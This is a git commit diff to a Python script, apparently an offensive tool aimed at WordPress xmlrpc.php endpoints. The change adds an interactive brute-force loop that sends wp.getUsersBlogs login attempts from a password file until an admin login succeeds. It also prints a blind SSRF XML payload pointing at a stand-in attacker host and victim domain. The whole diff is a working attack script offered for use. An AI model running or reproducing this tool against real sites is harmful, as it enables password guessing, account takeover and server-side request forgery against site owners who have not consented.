497c382b5650308240c66b7b97f4559d893a08e2
Amirmohammad irajimogadam <85231870+mrpentst@users.noreply.github.com>
2023-04-07 04:40:22 +0330

    Update xmlrpc.py

--- xmlrpc.py
+++ xmlrpc.py
@@ -7,51 +7,65 @@ ascii_art = pyfiglet.figlet_format(text)
 print(ascii_art)
 
 url = input("Enter URL: ")
-
-username = "admin"
-password = "admin"
-
 url = url.rstrip('/') + "/xmlrpc.php"
-
-payload = """<?xml version="1.0"?>
-<methodCall>
-<methodName>wp.getUsersBlogs</methodName>
-<params>
-<param><value>{0}</value></param>
-<param><value>{1}</value></param>
-</params>
-</methodCall>
-""".format(username, password)
 
 headers = {
     'Content-Type': 'text/xml'
 }
 
-response = requests.post(url, headers=headers, data=payload)
-
-if "403" in response.text:
-    print("This site supported XMLRPC, you can exploit it, with this code:")
-    print("For Brute Force:")
-    print("""<methodCall>
+response = requests.post(url, headers=headers, data="""<?xml version="1.0"?>
+<methodCall>
 <methodName>wp.getUsersBlogs</methodName>
 <params>
+
 <param><value>admin</value></param>
-<param><value>pass</value></param>
+<param><value>admin</value></param>
 </params>
 </methodCall>""")
-    print("For Blind SSRF:")
-    print("""<methodCall>
-   <methodName>https://example.net:2121</methodName>
+
+if "403" in response.text:
+    print("This site supports XMLRPC and can be exploited.")
+    exploit = input("Do you want to exploit it? (yes or no): ")
+    if exploit.lower() == "yes":
+        exploit_type = input("Select an exploit type:\n1) Brute Force\n2) Blind SSRF\n which one?")
+        if exploit_type == "1":
+            username = input("Enter username: ")
+            password_file = input("Enter password file path: ")
+            with open(password_file, "r") as f:
+                for password in f.readlines():
+                    password = password.strip()
+                    payload = """<?xml version="1.0"?>
+                    <methodCall>
+                    <methodName>wp.getUsersBlogs</methodName>
+                    <params>
+
+                    <param><value>{0}</value></param>
+                    <param><value>{1}</value></param>
+                    </params>
+                    </methodCall>
+                    """.format(username, password)
+                    response = requests.post(url, headers=headers, data=payload)
+                    if "isAdmin" in response.text:
+                        print("You're logged in! Password: {}".format(password))
+                        break
+                else:
+                    print("Could not find valid password.")
+        elif exploit_type == "2":
+            print("""<methodCall>
+   <methodName>https://attacker.tld:2121</methodName>
   <params>
     <param>
-      <value><string>https://google.com</string></value>
+      <value><string>https://victim.com</string></value>
     </param>
     <param>
-      <value><string>https://google.com/everything-about</string></value>
+      <value><string>https://victim.com/everything-about</string></value>
     </param>
   </params>
 </methodCall>""")
+        else:
+            print("Invalid exploit type selected.")
+    else:
+        print("Exploitation canceled.")
 else:
-    print("xmlrpc is not exploited")
-
+    print("XMLRPC is not supported.")
 print("Bye!")
